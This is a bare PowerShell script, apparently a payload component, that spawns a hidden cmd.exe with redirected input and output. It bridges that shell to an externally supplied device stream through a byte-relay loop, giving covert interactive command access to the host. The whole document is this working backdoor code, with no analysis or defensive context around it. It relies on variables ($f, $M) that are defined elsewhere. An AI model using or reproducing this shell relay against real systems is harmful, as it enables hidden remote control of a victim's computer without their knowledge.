function spawn() {
	$p = New-Object -TypeName System.Diagnostics.Process
    $i = $p.StartInfo
	$i.CreateNoWindow = $true
	$i.UseShellExecute = $false
	$i.RedirectStandardInput = $true
	$i.RedirectStandardOutput = $true
	$i.RedirectStandardError = $true
    $i.FileName = "cmd.exe"
	$i.Arguments = "/c cmd.exe /k 2>&1 "
	$d = $p.Start()
	return $p
}

function connect($f, $r, $w) {
	$sb = New-Object Byte[] ($M+1)
	$fb = New-Object Byte[] ($M+1)

	$st = $r.BeginRead($sb, 2, ($M-1), $null, $null)
	$ft = $f.BeginRead($fb, 0, ($M+1), $null, $null)

	$stotal = 0
	$ftotal = 0
	Write-Output "Entering main loop"
	while ($st -ne $null -and $ft -ne $null) {
		try {
			if ($st.IsCompleted) {
				$sbr = $r.EndRead($st)
				if ($sbr -gt 0) {
					$stotal += $sbr
					[string]::Format( "Socket {0} - Device {1}", $stotal, $ftotal)
					$sb[1] = $sbr
					$f.Write($sb, 0, $M+1)
					$f.Flush()
					$st = $r.BeginRead($sb, 2, ($M-1), $null, $null)
				} else {
					$st = $null
				}
			} elseif ($ft.IsCompleted) {
				$fbr = $f.EndRead($ft)
				if ($fbr -gt 0) {
					$ftotal += $fb[1]
					[string]::Format( "Socket {0} - Device {1}", $stotal, $ftotal)
					$swo = $w.Write($fb, 2, $fb[1])
					$w.Flush()
					$ft = $f.BeginRead($fb, 0, ($M+1), $null, $null)
				} else {
					$ft = $null
				}
			} else {
				Start-Sleep -m 1
			}
		} catch {
			$ErrorMessage = $_.Exception.Message
		    $FailedItem = $_.Exception.ItemName
			Write-Output "Exception caught, terminating main loop"
			Write-Output $ErrorMessage
			Write-Output $FailedItem
			break
		}
	}

	Write-Output "Main loop completed"

	$f.Close()
	$r.Close()
	$w.Close()
}

$p = spawn
connect $f $p.StandardOutput.BaseStream $p.StandardInput.BaseStream
